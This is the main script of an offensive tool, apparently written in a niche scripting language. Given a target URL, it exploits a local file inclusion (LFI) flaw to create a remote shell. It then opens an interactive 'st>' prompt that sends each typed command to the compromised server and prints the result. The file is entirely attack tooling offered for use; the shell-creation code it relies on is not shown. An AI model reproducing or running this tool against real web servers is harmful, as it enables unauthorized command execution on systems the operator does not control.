class ShellCommand {
    Quit: 'quit',
};

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        switch (cmd) {
            ShellCommand.Quit: {
                print('Exiting');
                quit();
            }
            default: cmd |> shell.run |> print;
        }
    }
};

shell = null;

switch (args.Mode) {
    ArgOption.Lfi: {
        print('Exploiting LFI');
        next_url = @(seq) args.Url % seq;    
        shell = LfiShell(args.Url % '', next_url);    
        
        if (!shell.create()) {
            print('Failed to create shell, exiting');
            quit();
        }
    }
    
    default: {
        print('Invalid mode: %s' % args.Mode);
        quit();
    }
}

shellLoop(shell);